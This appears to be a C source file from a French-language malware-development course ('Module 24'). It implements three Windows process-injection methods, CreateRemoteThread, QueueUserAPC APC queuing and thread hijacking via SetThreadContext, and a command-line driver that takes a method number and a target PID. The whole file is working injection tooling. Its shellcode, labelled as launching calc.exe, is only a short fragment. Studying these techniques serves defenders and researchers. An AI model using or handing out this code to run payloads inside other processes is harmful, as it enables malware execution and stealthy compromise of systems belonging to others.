/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 24 : Process Injection Techniques
 */

#include <windows.h>
#include <stdio.h>

// Shellcode calc.exe (x64)
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48";

// 1. Classic CreateRemoteThread
BOOL inject_create_remote_thread(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, mem, shellcode, sizeof(shellcode), NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)mem,
                                       NULL, 0, NULL);
    if (hThread) {
        printf("[+] CreateRemoteThread injection successful\n");
        CloseHandle(hThread);
    }

    CloseHandle(hProc);
    return hThread != NULL;
}

// 2. QueueUserAPC injection
BOOL inject_queue_apc(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    // Allouer et écrire shellcode
    LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, mem, shellcode, sizeof(shellcode), NULL);

    // Trouver thread en état alertable
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    Thread32First(hSnapshot, &te32);
    do {
        if (te32.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
            if (hThread) {
                QueueUserAPC((PAPCFUNC)mem, hThread, 0);
                printf("[+] APC queued to thread %lu\n", te32.th32ThreadID);
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    CloseHandle(hProc);
    return TRUE;
}

// 3. Thread Hijacking
BOOL inject_thread_hijack(DWORD pid) {
    // Ouvrir processus
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allouer shellcode
    LPVOID mem = VirtualAllocEx(hProc, NULL, sizeof(shellcode),
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, mem, shellcode, sizeof(shellcode), NULL);

    // Trouver premier thread
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32;
    te32.dwSize = sizeof(te32);

    Thread32First(hSnapshot, &te32);
    do {
        if (te32.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            
            // Suspendre thread
            SuspendThread(hThread);

            // Modifier contexte
            CONTEXT ctx;
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(hThread, &ctx);
            
            #ifdef _WIN64
            ctx.Rip = (DWORD64)mem;  // x64
            #else
            ctx.Eip = (DWORD)mem;    // x86
            #endif

            SetThreadContext(hThread, &ctx);

            // Reprendre
            ResumeThread(hThread);

            printf("[+] Thread hijacked\n");
            CloseHandle(hThread);
            break;
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    CloseHandle(hProc);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <method> <pid>\n", argv[0]);
        printf("Methods: 1=CreateRemoteThread, 2=QueueUserAPC, 3=ThreadHijack\n");
        return 1;
    }

    int method = atoi(argv[1]);
    DWORD pid = atoi(argv[2]);

    switch(method) {
        case 1: inject_create_remote_thread(pid); break;
        case 2: inject_queue_apc(pid); break;
        case 3: inject_thread_hijack(pid); break;
        default: printf("Invalid method\n");
    }

    return 0;
}
